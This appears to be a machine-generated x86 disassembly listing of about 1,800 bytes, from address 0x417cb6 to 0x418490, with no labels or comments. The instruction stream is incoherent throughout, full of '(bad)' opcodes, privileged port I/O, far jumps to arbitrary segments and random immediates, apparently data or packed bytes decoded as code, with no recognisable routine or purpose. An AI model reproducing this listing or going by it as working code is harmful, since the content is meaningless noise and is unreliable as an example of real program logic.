  417cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cb7:	(bad)  
  417cb8:	out    dx,eax
  417cb9:	repz enter 0xfdae,0x5d
  417cbe:	in     al,dx
  417cbf:	inc    esp
  417cc0:	add    BYTE PTR [ebx],ah
  417cc2:	es push ss
  417cc4:	cmp    eax,0x66825b7f
  417cc9:	mov    edx,0x40a66f17
  417cce:	outs   dx,BYTE PTR ds:[esi]
  417ccf:	dec    edi
  417cd0:	and    ch,BYTE PTR [esi]
  417cd2:	sar    DWORD PTR [ecx-0x65],1
  417cd5:	mov    al,0xb7
  417cd7:	mov    eax,ds:0x31aebd0e
  417cdc:	loopne 0x417cfc
  417cde:	push   ss
  417cdf:	push   ds
  417ce0:	call   0x2c66a9a7
  417ce5:	adc    al,0x5e
  417ce7:	scas   eax,DWORD PTR es:[edi]
  417ce8:	jno    0x417d0f
  417cea:	test   cl,al
  417cec:	fnstsw WORD PTR [ebx]
  417cee:	adc    al,0x5c
  417cf0:	inc    ebp
  417cf1:	je     0x417ce1
  417cf3:	rol    DWORD PTR [esp+edi*2-0x64],1
  417cf7:	jp     0x417d62
  417cf9:	mov    ecx,0xce79d874
  417cfe:	and    eax,0xa9edcdc7
  417d03:	push   es
  417d04:	stos   DWORD PTR es:[edi],eax
  417d05:	jg     0x417d63
  417d07:	repnz dec edi
  417d09:	(bad)  
  417d0b:	arpl   WORD PTR [edx-0x30],bp
  417d0e:	sbb    al,0xab
  417d10:	dec    ecx
  417d11:	in     al,0x53
  417d13:	(bad)  
  417d14:	adc    BYTE PTR [edx],ah
  417d16:	dec    ebx
  417d17:	out    dx,al
  417d18:	jle    0x417cec
  417d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d1b:	sub    bl,ch
  417d1d:	xchg   ecx,eax
  417d1e:	sti    
  417d1f:	enter  0xd2ee,0x1
  417d23:	loope  0x417d7e
  417d25:	dec    edi
  417d26:	push   ds
  417d27:	je     0x417d75
  417d29:	cld    
  417d2a:	imul   ebp,DWORD PTR [edx],0xffffff85
  417d2d:	rol    BYTE PTR [ebx+0x6bf00830],cl
  417d33:	adc    al,bh
  417d35:	or     dl,bl
  417d37:	xor    bl,BYTE PTR [eax]
  417d39:	(bad)  
  417d3b:	pusha  
  417d3c:	jns    0x417d90
  417d3e:	leave  
  417d3f:	pop    edi
  417d40:	dec    ebx
  417d41:	pushf  
  417d42:	pop    eax
  417d43:	retf   0x2fce
  417d46:	daa    
  417d47:	xchg   edx,eax
  417d48:	jg     0x417ce6
  417d4a:	cmp    bl,BYTE PTR [ebx+0x5f2761a7]
  417d50:	(bad)  
  417d51:	adc    ebp,ecx
  417d53:	ins    DWORD PTR es:[edi],dx
  417d54:	cmp    edx,DWORD PTR [ecx]
  417d56:	pop    eax
  417d57:	sbb    DWORD PTR [ebx+esi*2-0x72],ecx
  417d5b:	jne    0x417d73
  417d5d:	xchg   si,ax
  417d5f:	imul   edx,DWORD PTR [edi+0xc584e36],0x4c037a33
  417d69:	xor    al,0xdf
  417d6b:	rcl    BYTE PTR [edi+0x20],1
  417d6e:	test   DWORD PTR [edi],edx
  417d70:	push   ss
  417d71:	add    BYTE PTR [esp+ecx*4],bl
  417d74:	jl     0x417d83
  417d76:	dec    edx
  417d77:	mov    al,ds:0x28574579
  417d7c:	loop   0x417d7d
  417d7e:	std    
  417d7f:	pop    esp
  417d80:	jmp    0x417d6a
  417d82:	push   ss
  417d83:	jg     0x417dd2
  417d85:	mov    ecx,0x9e2bf808
  417d8a:	fwait
  417d8b:	mov    ebp,DWORD PTR [edi]
  417d8d:	fisttp QWORD PTR [esi]
  417d8f:	mov    ebp,0x31c6b3d0
  417d94:	aaa    
  417d95:	add    bh,BYTE PTR [ebx+0x23]
  417d98:	jecxz  0x417df3
  417d9a:	addr16 loopne 0x417d9c
  417d9d:	xchg   ebx,eax
  417d9e:	adc    DWORD PTR [ebx+0x22],0xd87c6828
  417da5:	imul   esi,DWORD PTR [ecx],0x1d1f3879
  417dab:	xchg   esp,eax
  417dac:	(bad)  
  417dad:	cli    
  417dae:	cmp    esp,DWORD PTR [edi]
  417db0:	loope  0x417d55
  417db2:	(bad)  ds:0x57ab24e7
  417db8:	mov    ecx,0x8290fbe4
  417dbd:	jg     0x417d8f
  417dbf:	das    
  417dc0:	jae    0x417e2e
  417dc2:	mov    ah,0xf5
  417dc4:	ins    DWORD PTR es:[edi],dx
  417dc5:	out    0xc9,al
  417dc7:	xchg   DWORD PTR [edi-0x2fd6fc6f],eax
  417dcd:	mov    al,0x38
  417dcf:	mov    ds:0x4bce6c40,eax
  417dd4:	pop    ss
  417dd5:	and    al,0x97
  417dd7:	mov    bh,0x15
  417dd9:	jmp    0xd009a090
  417dde:	xor    eax,0x1c
  417de1:	fidiv  DWORD PTR [edx]
  417de3:	pop    ss
  417de4:	mov    bh,0xe
  417de6:	add    DWORD PTR [eax-0x5a],eax
  417de9:	mov    al,0x10
  417deb:	dec    ecx
  417dec:	mov    ecx,0x1c8db714
  417df1:	and    BYTE PTR [eax-0x4b88c9e6],dl
  417df7:	pop    ds
  417df8:	jbe    0x417e2a
  417dfa:	loope  0x417e2b
  417dfc:	sub    ch,0xe3
  417dff:	xlat   BYTE PTR ds:[ebx]
  417e00:	add    eax,0xf8dfbe34
  417e05:	and    esp,DWORD PTR [esi]
  417e07:	pop    ss
  417e08:	xor    BYTE PTR [edx-0x34e1b946],0x5c
  417e0f:	push   es
  417e10:	mov    bh,0x28
  417e12:	or     cl,BYTE PTR [esi+0x3a5058de]
  417e18:	lods   eax,DWORD PTR ds:[esi]
  417e19:	lods   eax,DWORD PTR ds:[esi]
  417e1a:	and    dl,BYTE PTR [ebx-0x5c327cb2]
  417e20:	in     al,0xa8
  417e22:	jno    0x417e44
  417e24:	pop    esi
  417e25:	sbb    al,0x70
  417e27:	pop    ds
  417e28:	cmp    al,0x4a
  417e2a:	xchg   BYTE PTR [ecx+eax*4+0x13dbf68d],cl
  417e31:	mov    BYTE PTR [edx-0x7960c367],cl
  417e37:	fs das 
  417e39:	inc    edx
  417e3a:	cmp    BYTE PTR [ecx],dh
  417e3c:	pop    edi
  417e3d:	mov    edx,0xce7a69f0
  417e42:	leave  
  417e43:	fisubr DWORD PTR [edx-0x28cddb9f]
  417e49:	mov    eax,ds:0x281d9741
  417e4e:	pop    edx
  417e4f:	pop    ecx
  417e50:	mov    ?,WORD PTR [eax+0x7e]
  417e53:	mov    esi,DWORD PTR [esi-0x7c]
  417e56:	push   esp
  417e57:	pop    ss
  417e58:	mov    al,es:0xf7dda8b
  417e5e:	lea    eax,[edi+0x1b7727a3]
  417e64:	fisub  WORD PTR [ebx-0x58]
  417e67:	clc    
  417e68:	sbb    ch,BYTE PTR [ecx+0x43c73bf9]
  417e6e:	jnp    0x417e98
  417e70:	pushf  
  417e71:	xchg   ebp,eax
  417e72:	cmc    
  417e73:	bound  eax,QWORD PTR [edi+ebx*8]
  417e76:	dec    esi
  417e77:	mov    cl,0x48
  417e79:	fbld   TBYTE PTR [esi]
  417e7b:	jecxz  0x417e92
  417e7d:	xchg   ebp,eax
  417e7e:	mov    edi,0xc51dc730
  417e83:	mov    edi,0xc522684f
  417e88:	add    dh,BYTE PTR [ebx+ecx*2+0x3877273d]
  417e8f:	popf   
  417e90:	jl     0x417eed
  417e92:	fwait
  417e93:	xchg   edi,eax
  417e94:	sbb    DWORD PTR ds:0xfbfa60f2,eax
  417e9a:	ror    BYTE PTR [edi-0x1a],1
  417e9d:	je     0x417ef4
  417e9f:	out    0xc6,eax
  417ea1:	dec    ebp
  417ea2:	pushf  
  417ea3:	out    dx,al
  417ea4:	imul   DWORD PTR [ebp+0x34]
  417ea7:	and    dl,BYTE PTR [ebx+0x65]
  417eaa:	fld    DWORD PTR ds:0xf43dff56
  417eb0:	pusha  
  417eb1:	mov    cl,0xcb
  417eb3:	aaa    
  417eb4:	sbb    cl,BYTE PTR [esi]
  417eb6:	retf   0x8615
  417eb9:	mov    ebx,0x30bfc9c6
  417ebe:	clc    
  417ebf:	popf   
  417ec0:	imul   edi,DWORD PTR [ebx+0x1d],0x8739445
  417ec7:	in     eax,0x7d
  417ec9:	cmp    eax,0x105ad05d
  417ece:	shl    DWORD PTR [ebp-0x21],0xb4
  417ed2:	and    BYTE PTR [ecx],ch
  417ed4:	and    DWORD PTR [ebx-0x80],esp
  417ed7:	popf   
  417ed8:	shr    BYTE PTR [ebx+0x57],1
  417edb:	imul   edi,DWORD PTR [ebx],0x4c
  417ede:	dec    ebp
  417edf:	rcl    BYTE PTR [edx-0x7a],cl
  417ee2:	adc    dh,BYTE PTR [ecx+eax*8+0x3975b0c7]
  417ee9:	cdq    
  417eea:	xor    eax,0x4cf40e71
  417eef:	jp     0x417e7d
  417ef1:	cmp    eax,ecx
  417ef3:	jle    0x417e9e
  417ef5:	fsqrt  
  417ef7:	repz cmp al,0xd5
  417efa:	cld    
  417efb:	fild   DWORD PTR [ebx-0x6f849713]
  417f01:	push   eax
  417f02:	pop    ds
  417f03:	sub    DWORD PTR [ebx+0x7a],edi
  417f06:	dec    eax
  417f07:	outs   dx,BYTE PTR ds:[esi]
  417f08:	xor    eax,0xad43344e
  417f0d:	out    dx,eax
  417f0e:	xchg   ebp,eax
  417f0f:	lods   eax,DWORD PTR ds:[esi]
  417f10:	out    0x92,al
  417f12:	pusha  
  417f13:	cmp    eax,0xe7864230
  417f18:	arpl   WORD PTR [ecx+ebp*1],dx
  417f1b:	xchg   ebx,eax
  417f1c:	shl    edx,0x32
  417f1f:	push   cs
  417f20:	sub    DWORD PTR [edi-0x50],ecx
  417f23:	leave  
  417f24:	and    BYTE PTR [eiz*4+0x25c7beac],0x53
  417f2c:	dec    ecx
  417f2d:	xchg   ebx,eax
  417f2e:	mov    cl,0xfc
  417f30:	aaa    
  417f31:	icebp  
  417f32:	call   0xcb97bba9
  417f37:	(bad)  
  417f38:	call   0x342c0bf0
  417f3d:	mov    BYTE PTR [ebx],bl
  417f3f:	test   al,0xad
  417f41:	and    dh,BYTE PTR [ebx-0x6826caca]
  417f47:	fistp  QWORD PTR [esi-0x215a818f]
  417f4d:	sahf   
  417f4e:	imul   edx,DWORD PTR gs:[esi],0x4d
  417f52:	test   eax,0x88d9f33c
  417f57:	(bad)  
  417f58:	xchg   edx,eax
  417f59:	mov    esi,0x76db239b
  417f5e:	or     bl,BYTE PTR [esi]
  417f60:	retf   0x7252
  417f63:	xor    bl,cl
  417f65:	cld    
  417f66:	or     ebp,ebx
  417f68:	xchg   edx,eax
  417f69:	lahf   
  417f6a:	inc    edi
  417f6b:	add    DWORD PTR [ecx],esp
  417f6d:	xchg   edi,eax
  417f6e:	leave  
  417f6f:	inc    ebp
  417f70:	scas   eax,DWORD PTR es:[edi]
  417f71:	aam    0xe2
  417f73:	repz xchg edx,eax
  417f75:	mov    edx,0x1b6fc857
  417f7a:	icebp  
  417f7b:	fidiv  WORD PTR [eax-0x7b]
  417f7e:	div    DWORD PTR [ebp+0x7b]
  417f81:	sub    BYTE PTR [edx-0x52],ah
  417f84:	int    0x1f
  417f86:	xchg   BYTE PTR [esi-0x5802e290],al
  417f8c:	addr16 (bad) 
  417f8e:	rol    ecx,1
  417f90:	and    esp,DWORD PTR [ecx-0x23]
  417f93:	ins    BYTE PTR es:[edi],dx
  417f94:	pusha  
  417f95:	inc    ecx
  417f96:	xchg   edx,eax
  417f97:	sub    DWORD PTR [ebp-0xa0701a4],0x10
  417f9e:	iret   
  417f9f:	dec    esp
  417fa0:	in     al,0x86
  417fa2:	(bad)  
  417fa3:	lahf   
  417fa4:	mov    eax,ds:0xa378fe6e
  417fa9:	out    0x9a,eax
  417fab:	dec    edx
  417fac:	je     0x417f39
  417fae:	pop    ds
  417faf:	fs popf 
  417fb1:	cmp    ecx,DWORD PTR [esi+0x5b24e858]
  417fb7:	ins    BYTE PTR es:[edi],dx
  417fb8:	push   eax
  417fb9:	mov    ds,WORD PTR [eax]
  417fbb:	push   eax
  417fbc:	pop    esp
  417fbd:	sbb    eax,0x6d127302
  417fc2:	mov    esi,0xa13fb556
  417fc7:	xor    DWORD PTR [edi+ebp*1],esi
  417fca:	sbb    al,0xa0
  417fcc:	loopne 0x417fed
  417fce:	test   DWORD PTR [ecx-0x62],ebp
  417fd1:	scas   al,BYTE PTR es:[edi]
  417fd2:	icebp  
  417fd3:	paddsw mm2,QWORD PTR [esi+0x49c1ecbf]
  417fda:	mov    esi,edx
  417fdc:	mov    BYTE PTR [ebx],ch
  417fde:	out    0xbc,eax
  417fe0:	fnstsw WORD PTR [esi]
  417fe2:	inc    esp
  417fe3:	call   0xb2cf:0x55a95687
  417fea:	mov    al,BYTE PTR [edx+edx*8+0x5f]
  417fee:	or     cl,BYTE PTR [edx-0x23eda458]
  417ff4:	cmp    ch,bh
  417ff6:	(bad)  
  417ff7:	dec    ecx
  417ff8:	out    dx,al
  417ff9:	xor    DWORD PTR [ecx-0x68b84e5a],0x3a880b62
  418003:	pop    ecx
  418004:	(bad)  
  418005:	pop    esp
  418006:	ja     0x417fc1
  418008:	or     al,BYTE PTR [esi+eax*1]
  41800b:	push   edi
  41800c:	dec    ebp
  41800d:	mov    ah,0x4d
  41800f:	je     0x417fe5
  418011:	test   ebx,edi
  418013:	mov    WORD PTR [esi-0x61],fs
  418016:	popf   
  418017:	call   0xa5f6ab0f
  41801c:	pop    edi
  41801d:	and    ebx,DWORD PTR [edi+ecx*2-0x579a40f2]
  418024:	pop    edi
  418025:	fidivr WORD PTR [ebx+0x19919004]
  41802b:	mov    bl,0x23
  41802d:	xor    BYTE PTR [ecx],0x67
  418030:	sbb    eax,0xfff32e98
  418035:	sub    BYTE PTR [ebx-0x67f5902d],ch
  41803b:	(bad)  
  41803c:	retf   
  41803d:	vunpcklpd ymm4,ymm7,YMMWORD PTR [ebx]
  418041:	xor    al,0x9d
  418043:	and    esi,eax
  418045:	xor    BYTE PTR ds:0xf7c3c97c,cl
  41804b:	loope  0x417fe3
  41804d:	inc    esp
  41804e:	sahf   
  41804f:	(bad)  
  418051:	clc    
  418052:	jle    0x41806b
  418054:	mov    ah,0x2b
  418056:	sbb    al,0x5e
  418058:	jmp    FWORD PTR [edx+esi*4]
  41805b:	daa    
  41805c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41805d:	mov    dh,0x29
  41805f:	xchg   edx,eax
  418060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418061:	xor    ecx,DWORD PTR [edx+0x17]
  418064:	scas   eax,DWORD PTR es:[edi]
  418065:	sub    esp,DWORD PTR [ebx+ecx*8]
  418068:	mov    cl,BYTE PTR [esi-0x2dac329f]
  41806e:	shl    DWORD PTR [ebp+edi*2-0x37],0xfa
  418073:	test   bl,0x77
  418076:	push   edi
  418077:	sub    cl,BYTE PTR [ebx+0x3e9d4706]
  41807d:	cmp    dl,BYTE PTR [edx+eiz*1-0x57]
  418081:	push   esp
  418082:	mov    ds:0x151dc7c6,eax
  418087:	out    dx,al
  418088:	std    
  418089:	aad    0xfc
  41808b:	mov    ebx,0x6847dee1
  418090:	sub    al,0x93
  418092:	xchg   BYTE PTR [eax+0x21],ah
  418095:	outs   dx,DWORD PTR ds:[esi]
  418096:	sbb    al,0xdb
  418098:	jge    0x41808d
  41809a:	ss loop 0x418046
  41809d:	mov    cl,0x84
  41809f:	cmp    ch,bl
  4180a1:	mov    esi,0x9590a5a4
  4180a6:	popf   
  4180a7:	cmp    DWORD PTR [ecx+0x507ba22b],esp
  4180ad:	and    eax,0x3d5746ec
  4180b2:	imul   eax,DWORD PTR [eax+0x3c094416],0xb5d4904c
  4180bc:	mov    dl,0xf3
  4180be:	pop    ecx
  4180bf:	loope  0x4180c9
  4180c1:	jp     0x4180b7
  4180c3:	dec    edi
  4180c4:	gs ja  0x4180c8
  4180c7:	gs push ss
  4180c9:	mov    edx,0x4f1d13da
  4180ce:	out    dx,eax
  4180cf:	mov    DWORD PTR [ecx+0x7c],esi
  4180d2:	jle    0x41814b
  4180d4:	mov    ch,0x29
  4180d6:	cs mov dh,0x9e
  4180d9:	mov    bl,0xb4
  4180db:	mov    ss,WORD PTR [ebp+edx*2-0x40]
  4180df:	mov    al,0x39
  4180e1:	out    dx,al
  4180e2:	xor    esp,ebp
  4180e4:	lods   al,BYTE PTR ds:[esi]
  4180e5:	ins    BYTE PTR es:[edi],dx
  4180e6:	or     eax,0x18291eeb
  4180eb:	mov    ecx,0x76efa84c
  4180f0:	inc    ebx
  4180f1:	cmp    eax,0xd45646b4
  4180f6:	(bad)
  4180f9:	clc    
  4180fa:	xchg   DWORD PTR [ecx-0x5e9c144c],edx
  418100:	jne    0x418155
  418102:	xor    BYTE PTR [ecx],0x98
  418105:	push   ss
  418106:	xchg   esi,eax
  418107:	mov    bh,0x21
  418109:	or     esi,DWORD PTR [edi-0x4b]
  41810c:	mov    bh,0x9c
  41810e:	test   al,0xc8
  418110:	cmp    bh,BYTE PTR [eax+0x252c4250]
  418116:	jecxz  0x4180cf
  418118:	mov    ebp,0x6384798f
  41811d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41811e:	je     0x41811f
  418120:	push   edx
  418121:	out    dx,eax
  418122:	mov    dh,0xfe
  418124:	test   al,0x63
  418126:	jg     0x418139
  418128:	and    al,0xb7
  41812a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41812b:	sub    al,0x8b
  41812d:	out    dx,al
  41812e:	mov    esi,DWORD PTR [edx+0x42b786de]
  418134:	outs   dx,BYTE PTR ds:[esi]
  418135:	push   cs
  418136:	pop    ecx
  418137:	sbb    al,BYTE PTR [eax+0x1f1b8e67]
  41813d:	push   ss
  41813e:	int3   
  41813f:	sar    ah,0xae
  418142:	xchg   ebx,eax
  418143:	sbb    esp,edx
  418145:	sub    edx,DWORD PTR [ecx-0x73]
  418148:	aas    
  418149:	test   DWORD PTR [eax+eax*8+0x2d],ecx
  41814d:	sbb    DWORD PTR ds:0x78c71d3,edi
  418153:	fcmovne st,st(4)
  418155:	fisub  WORD PTR [edi+edi*1-0x64682150]
  41815c:	add    eax,0xa8191d44
  418161:	jle    0x4181ae
  418163:	sbb    BYTE PTR [edi-0x65],dh
  418166:	arpl   dx,di
  418168:	xor    eax,esp
  41816a:	jmp    0x434e:0x92ec1e51
  418171:	icebp  
  418172:	push   esi
  418173:	xor    DWORD PTR [ebx-0x38dd3165],edx
  418179:	pop    ebx
  41817a:	ficomp DWORD PTR [edi]
  41817c:	rol    DWORD PTR [ecx-0x7a07a0ff],1
  418182:	sahf   
  418183:	icebp  
  418184:	mov    ebx,0x3db81039
  418189:	(bad)  
  41818a:	xor    BYTE PTR [edx+0x3060f1b6],ah
  418190:	pop    edi
  418191:	hlt    
  418192:	shr    BYTE PTR [edi-0x30140426],1
  418198:	xchg   ebx,eax
  418199:	ins    DWORD PTR es:[edi],dx
  41819a:	sub    esi,0xabeb0bf6
  4181a0:	imul   edx,DWORD PTR [edx],0x3a4c1b89
  4181a6:	or     al,dl
  4181a8:	cwde   
  4181a9:	mov    edi,0x9a2bd41e
  4181ae:	add    BYTE PTR [edx],cl
  4181b0:	sahf   
  4181b1:	jo     0x41817e
  4181b3:	jno    0x418169
  4181b5:	cld    
  4181b6:	cmp    cl,cl
  4181b8:	mov    dh,0x4
  4181ba:	and    BYTE PTR [ebp-0x22],ch
  4181bd:	daa    
  4181be:	and    ecx,ebx
  4181c0:	lds    edi,FWORD PTR [ecx-0x7fae5c87]
  4181c6:	pop    edi
  4181c7:	push   ebp
  4181c8:	jmp    0x67f12d1b
  4181cd:	adc    BYTE PTR ds:0x51e78d61,bh
  4181d3:	dec    esi
  4181d4:	sub    ebx,DWORD PTR [esi+0x16]
  4181d7:	or     eax,DWORD PTR [ebx+0x20]
  4181da:	(bad)  ds:0xb8904374
  4181e0:	push   0x1aeba6d4
  4181e5:	cmp    eax,ebp
  4181e7:	stc    
  4181e8:	mov    edx,0xa53f7d15
  4181ed:	jmp    0x577893a5
  4181f2:	rcl    eax,0xff
  4181f5:	mov    bl,0xb2
  4181f7:	mov    ch,0xd6
  4181f9:	mov    ah,0xb0
  4181fb:	inc    edx
  4181fc:	clc    
  4181fd:	(bad)  
  4181fe:	popa   
  4181ff:	mov    dl,0xb7
  418201:	fidiv  WORD PTR [eax+0x18485c7a]
  418207:	fwait
  418208:	pop    edx
  418209:	mov    ch,0xdf
  41820b:	jmp    0x4181d9
  41820d:	xchg   ebx,eax
  41820e:	cli    
  41820f:	inc    ecx
  418210:	pop    ebp
  418211:	xchg   BYTE PTR [edx-0x2e],dh
  418214:	out    dx,eax
  418215:	fs (bad) 
  418217:	push   ecx
  418218:	arpl   WORD PTR [esp+ebp*2-0x49b22819],bp
  41821f:	ret    0x8224
  418222:	adc    bh,BYTE PTR [edi]
  418224:	pop    esi
  418225:	fistp  DWORD PTR [ebp+ecx*2-0x54]
  418229:	enter  0x1c2d,0xdc
  41822d:	add    al,0xf8
  41822f:	jmp    FWORD PTR [eax-0x6639b2ca]
  418235:	test   bl,dl
  418237:	leave  
  418238:	mov    ecx,0x52f239d3
  41823d:	jl     0x4181d5
  41823f:	nop
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	aam    0x1f
  418243:	ror    DWORD PTR [esi+0x9cb6bb0],cl
  418249:	jne    0x418295
  41824b:	push   0x77
  41824d:	loope  0x41829c
  41824f:	mov    eax,ds:0x1e5b2be5
  418254:	mov    ebx,0x40747034
  418259:	test   eax,0x763407a3
  41825e:	fdiv   st(7),st
  418260:	dec    esi
  418261:	dec    esi
  418262:	xchg   esp,eax
  418263:	push   ebx
  418264:	test   eax,0x4aab5b63
  418269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41826a:	xchg   DWORD PTR [edi-0x33c975b4],ebp
  418270:	(bad)  
  418271:	aam    0xba
  418273:	aam    0xa0
  418275:	xor    esi,ebp
  418277:	retf   
  418278:	or     BYTE PTR [edi],al
  41827a:	std    
  41827b:	jnp    0x418204
  41827d:	mov    ch,0x4c
  41827f:	cmp    DWORD PTR [ebp-0x27],0xffffffae
  418283:	ror    DWORD PTR [eax],1
  418285:	lods   al,BYTE PTR ds:[esi]
  418286:	into   
  418287:	loop   0x4182ff
  418289:	loopne 0x4182cb
  41828b:	push   edx
  41828c:	cli    
  41828d:	fisttp QWORD PTR [ebx]
  41828f:	push   es
  418290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418291:	dec    ebx
  418292:	adc    dl,BYTE PTR [edi-0x6c]
  418295:	adc    dh,cl
  418297:	adc    ch,BYTE PTR [edx-0x54]
  41829a:	xchg   ecx,eax
  41829b:	imul   ebp,ebp,0xafbc1ccd
  4182a1:	adc    edx,DWORD PTR [ecx+ebx*4-0x39]
  4182a5:	jb     0x418252
  4182a7:	cs add eax,0x48709eec
  4182ad:	mov    ah,0xca
  4182af:	loop   0x418241
  4182b1:	dec    edx
  4182b2:	daa    
  4182b3:	dec    esi
  4182b4:	dec    eax
  4182b5:	dec    esp
  4182b6:	mov    bh,0xb
  4182b8:	test   BYTE PTR [eax],bh
  4182ba:	(bad)  
  4182bb:	out    0x51,eax
  4182bd:	jne    0x41826b
  4182bf:	cmp    eax,0x6b8c3dd6
  4182c4:	daa    
  4182c5:	sub    al,0x24
  4182c7:	enter  0x150,0x5a
  4182cb:	adc    al,0x3c
  4182cd:	dec    esp
  4182ce:	les    esi,FWORD PTR [edx+0x600f35c]
  4182d4:	sbb    BYTE PTR [eax+esi*1+0x79],ah
  4182d8:	jmp    0x5f203b8c
  4182dd:	js     0x4182d9
  4182df:	mov    ecx,0x1b18cf8e
  4182e4:	jb     0x4182f5
  4182e6:	mov    ch,0x5a
  4182e8:	(bad)  [esi+eax*8]
  4182eb:	jmp    0x4182db
  4182ed:	sbb    DWORD PTR [edx-0x65],0xffffff88
  4182f1:	test   al,0x31
  4182f3:	jle    0x41833b
  4182f5:	inc    esi
  4182f6:	jmp    0xf29d:0x1f58010d
  4182fd:	mov    eax,0x7f4ee953
  418302:	or     ebp,DWORD PTR [eax-0x7a]
  418305:	ret    
  418306:	rcr    BYTE PTR [ebx+0x18d2dcb3],cl
  41830c:	sbb    al,0xe2
  41830e:	push   edx
  41830f:	add    cl,bl
  418311:	sbb    esp,ebp
  418313:	and    BYTE PTR [edi+edx*2-0x11],al
  418317:	and    BYTE PTR [ecx-0x3714ac5c],bl
  41831d:	das    
  41831e:	clc    
  41831f:	push   ss
  418320:	and    esp,0x3e
  418323:	pop    esp
  418324:	fdiv   st(4),st
  418326:	push   ebx
  418327:	push   ebp
  418328:	or     BYTE PTR [edi-0x74bc325f],al
  41832e:	push   esp
  41832f:	mov    bh,0x9
  418331:	(bad)  
  418332:	pushf  
  418333:	pushf  
  418334:	xchg   ecx,eax
  418335:	lea    ebp,[ebp+0x5]
  418338:	repz xor edi,DWORD PTR ss:[ebx-0x755249a2]
  418340:	ret    0xd52f
  418343:	xchg   ebp,eax
  418344:	aas    
  418345:	loop   0x41834a
  418347:	add    al,0xf8
  418349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41834a:	test   eax,0x1ac1e5d2
  41834f:	jo     0x4182fa
  418351:	jno    0x418327
  418353:	mov    fs,esp
  418355:	pushf  
  418356:	push   ebp
  418357:	inc    ecx
  418358:	adc    BYTE PTR [edi],bh
  41835a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41835b:	hlt    
  41835c:	mov    ecx,0x30c6fa65
  418361:	in     al,0x6f
  418363:	sbb    BYTE PTR [esi-0x273bab47],ah
  418369:	daa    
  41836a:	into   
  41836b:	fadd   DWORD PTR [ecx+0x44]
  41836e:	clc    
  41836f:	loop   0x418380
  418371:	(bad)  
  418372:	jecxz  0x41831d
  418374:	jg     0x41838a
  418376:	fs gs dec ebp
  41837a:	fs mov ebx,0x59ecfdbd
  418380:	call   0x6ff2aa40
  418385:	adc    eax,0xb898e9bb
  41838a:	mov    ah,0x2
  41838c:	cdq    
  41838d:	sub    ah,BYTE PTR [ecx]
  41838f:	inc    edi
  418390:	adc    eax,0x8df5860f
  418395:	sub    bh,dl
  418397:	stc    
  418398:	inc    eax
  418399:	aas    
  41839a:	xor    dh,dh
  41839c:	sbb    DWORD PTR ds:0x390f5d5e,esp
  4183a2:	fmul   DWORD PTR ss:[ebp*8-0x2fa32c34]
  4183aa:	aas    
  4183ab:	cld    
  4183ac:	push   cs
  4183ad:	mov    esp,0xad87452
  4183b2:	in     eax,0xb2
  4183b4:	mov    al,0xd1
  4183b6:	dec    esi
  4183b7:	(bad)  
  4183b8:	(bad)  
  4183ba:	icebp  
  4183bb:	scas   al,BYTE PTR es:[edi]
  4183bc:	mov    gs,ecx
  4183be:	in     eax,0x70
  4183c0:	and    al,0x1a
  4183c2:	out    0xcb,eax
  4183c4:	push   ebp
  4183c5:	push   edi
  4183c6:	shl    bl,cl
  4183c8:	and    al,0x3d
  4183ca:	mov    ch,0x5c
  4183cc:	cli    
  4183cd:	bnd addr16 je 0x4183a4
  4183d1:	add    al,0xe7
  4183d3:	cmp    edi,ebx
  4183d5:	popf   
  4183d6:	xchg   DWORD PTR [ebp+0x45],ecx
  4183d9:	(bad)  
  4183db:	test   eax,0xe18254a2
  4183e0:	pop    esp
  4183e1:	sbb    DWORD PTR [ebp+0x277e22e],eax
  4183e7:	or     al,0xdb
  4183e9:	retf   0x8754
  4183ec:	fldcw  WORD PTR [ebp-0x63b55e48]
  4183f2:	pop    edi
  4183f3:	cmp    cl,BYTE PTR [ebp+edx*4-0x77]
  4183f7:	and    al,0x45
  4183f9:	into   
  4183fa:	jge    0x4183ae
  4183fc:	jl     0x41838b
  4183fe:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418400:	ret    
  418401:	loope  0x4183e3
  418403:	sub    ebp,edi
  418405:	gs push 0x1d02e07b
  41840b:	inc    ebx
  41840c:	rcr    BYTE PTR [edi+eax*4+0x33e0663e],cl
  418413:	nop
  418414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418415:	cmp    eax,0xac82b460
  41841a:	push   es
  41841b:	cli    
  41841c:	fnsave [edx+0x857a8e8]
  418422:	mov    WORD PTR [eax-0x705ea948],fs
  418428:	in     eax,dx
  418429:	inc    esi
  41842a:	enter  0x3f12,0xe8
  41842e:	jae    0x41849c
  418430:	sub    BYTE PTR [eax+ebp*4],bh
  418433:	jl     0x4184ad
  418435:	mov    DWORD PTR [ebp-0x19b0c6d8],ebp
  41843b:	xor    DWORD PTR [eax-0x205a27bb],edi
  418441:	or     al,0xbe
  418443:	mov    BYTE PTR [edi+0x60],ah
  418446:	jmp    0x41843d
  418448:	xchg   ebx,eax
  418449:	popf   
  41844a:	jl     0x41846a
  41844c:	sti    
  41844d:	int3   
  41844e:	mov    edi,0xf2b49473
  418453:	push   0x61d13d29
  418458:	cld    
  418459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41845a:	xchg   ah,al
  41845c:	jg     0x418443
  41845e:	int3   
  41845f:	cmp    al,BYTE PTR [esi]
  418461:	dec    esp
  418462:	mov    bl,0xe4
  418464:	fcomp  QWORD PTR [esi-0x120d7a30]
  41846a:	jp     0x4184d3
  41846c:	xor    bl,BYTE PTR [esi-0x61]
  41846f:	inc    ebx
  418470:	cli    
  418471:	mov    ds:0xd310ae2b,eax
  418476:	jmp    0x48ed:0x27d57cde
  41847d:	retf   0x9be
  418480:	pop    ebp
  418481:	push   ss
  418482:	jl     0x4184e8
  418484:	ja     0x418444
  418486:	fimul  DWORD PTR [edi+0x12cc723]
  41848c:	arpl   WORD PTR [edx],bp
  41848e:	add    ah,cl
  418490:	mov    cl,0x70
